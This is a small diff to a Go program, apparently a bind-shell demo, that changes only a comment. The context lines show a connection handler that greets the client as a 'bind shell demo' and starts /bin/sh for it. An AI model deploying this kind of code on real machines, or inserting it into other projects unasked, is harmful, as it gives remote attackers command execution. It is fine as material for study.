@@ -51,7 +51,7 @@ func main() {
 }
 
 func handleConnection(conn net.Conn) {
-	// use this shell means bind_shell only run in linux/unix
+	// use this shell means shell_demo only run in linux/unix
 	var shell = "/bin/sh"
 	_,_ = conn.Write([]byte("[+] bind shell demo \n"))
 	command := exec.Command(shell)
